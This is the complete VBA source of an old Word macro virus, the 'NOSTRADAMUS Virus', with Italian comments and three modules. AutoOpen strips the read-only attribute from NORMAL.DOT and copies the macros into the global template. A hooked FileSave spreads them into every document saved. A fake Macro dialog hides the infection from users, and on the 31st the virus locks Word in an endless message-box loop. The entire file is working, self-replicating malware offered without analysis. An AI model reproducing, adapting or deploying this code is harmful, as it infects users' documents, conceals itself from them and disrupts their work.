   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "MacroOnFile"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "=FileSalva --> NORMAL.DOT"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.MacroOnFile.MAIN"
   Dim Giorno
   Rem NOSTRADAMUS Virus
   Rem Macro : [MacroOnFile]
   Rem Coded by PFloriK 2/12/1996

   On Error GoTo -1: On Error GoTo Fine

   Rem Se il giorno e' il 31 si attiva, altrimenti continua l'infezione
   Giorno = WordBasic.Day(WordBasic.Now())
   If Giorno = 31 Then GoTo Attivo
   GoTo NonAttivo

   Rem In caso di attivazione viene mostrata la seguente finestra
   Attivo:
   WordBasic.MsgBox "Barbaro impero dal terzo sarai soggiogato," + Chr(13) + _
          "Gran parte d'individui della sua origine farà perire:" + Chr(13) + _
          "Per decesso senile avverrà la sua fine, il quarto colpirà" + Chr(13) _
         + "Per timore che il sangue con il sangue morte ne derivi." + Chr(13) _
         + Chr(13) + "Centuria 3°, LIX", "NOSTRADAMUS Virus", 0
   GoTo Attivo


   NonAttivo:
   Rem Converte il file .DOC in un modello di documento (.DOT)
   WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1

   Rem Copia le macro infette
   WordBasic.MacroCopy "Normal:StrumMacro", WordBasic.[FileName$]() + ":StrumMacro"
   WordBasic.MacroCopy "Normal:FileSalva", WordBasic.[FileName$]() + ":MacroOnFile"
   WordBasic.MacroCopy "Normal:MacroOnNORMAL", WordBasic.[FileName$]() + ":AutoOpen"

   Rem Salva il documento
   WordBasic.FileSave

   Fine:
   End Sub


   Attribute VB_Name = "StrumMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Stealth Macro"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.StrumMacro.MAIN"
   Dim x
   Rem NOSTRADAMUS Virus
   Rem Macro : [StrumMacro]
   Rem Coded by PFloriK 2/12/1996

   Rem Draw a MsgBox Dialog Window like the Macro command
   Rem but without listing active macros.....stealth!!!

   WordBasic.BeginDialog 210, 30, 420, 300, "Macro"
       WordBasic.TextBox 6, 22, 260, 18, "nomemacro"
       WordBasic.Text 9, 6, 253, 13, "Nome Macro:"
       WordBasic.CancelButton 280, 33, 130, 21
       WordBasic.PushButton 280, 8, 130, 21, "Registra..."
       WordBasic.PushButton 280, 65, 130, 21, "Esegui"
       WordBasic.PushButton 280, 90, 130, 21, "Crea"
       WordBasic.PushButton 280, 114, 130, 21, "Elimina"
       WordBasic.PushButton 280, 144, 130, 21, "Libreria..."
       ReDim EMPTYList__$(0)
       WordBasic.ListBox 14, 40, 252, 150, EMPTYList__$(), "List1"
       WordBasic.Text 9, 194, 253, 13, "Macro disponibili in:"
       ReDim STEALTHList__$(3)
       STEALTHList__$(0) = "Tutti i modelli attivi"
       STEALTHList__$(1) = "Normal.dot (modello generale)"
       STEALTHList__$(2) = "Comandi di Word"
       WordBasic.DropListBox 9, 205, 402, 72, STEALTHList__$(), "PROVA"
       WordBasic.Text 9, 228, 253, 13, "Descrizione:"
       WordBasic.ListBox 9, 240, 402, 48, EMPTYList__$(), "List2"
   WordBasic.EndDialog

   Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
   x = WordBasic.Dialog.UserDialog(dlg, 0)
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim Giorno
   Dim NORMALDir$
   Dim Nome$
   Rem NOSTRADAMUS Virus
   Rem Macro : [AutoOpen]
   Rem Coded by PFloriK 2/12/1996

   On Error GoTo -1: On Error GoTo Fine

   Rem Se il giorno e' il 31 si attiva, altrimenti continua l'infezione
   Giorno = WordBasic.Day(WordBasic.Now())
   If Giorno = 31 Then GoTo Attivo
   GoTo NonAttivo

   Rem In caso di attivazione viene mostrata la seguente finestra
   Attivo:
   WordBasic.MsgBox "Barbaro impero dal terzo sarai soggiogato," + Chr(13) + _
          "Gran parte d'individui della sua origine farà perire:" + Chr(13) + _
          "Per decesso senile avverrà la sua fine, il quarto colpirà" + Chr(13) _
         + "Per timore che il sangue con il sangue morte ne derivi." + Chr(13) _
         + Chr(13) + "Centuria 3°, LIX", "NOSTRADAMUS Virus", 0
   GoTo Attivo


   NonAttivo:
   Rem Toglie la protezione (ATTRIB -R) dal file NORMAL.DOT
   NORMALDir$ = WordBasic.[DefaultDir$](15)
   SetAttr NORMALDir$ + "\NORMAL.DOT", 0
   SetAttr NORMALDir$ + "\NORMAL.DOT", 32

   Rem Copia nei modelli le seguenti 3 macro
   Nome$ = WordBasic.[FileName$]()
   WordBasic.MacroCopy Nome$ + ":StrumMacro", "Normal:StrumMacro"
   WordBasic.MacroCopy Nome$ + ":MacroOnFile", "Normal:FileSalva"
   WordBasic.MacroCopy Nome$ + ":AutoOpen", "Normal:MacroOnNORMAL"

   Fine:
   End Sub
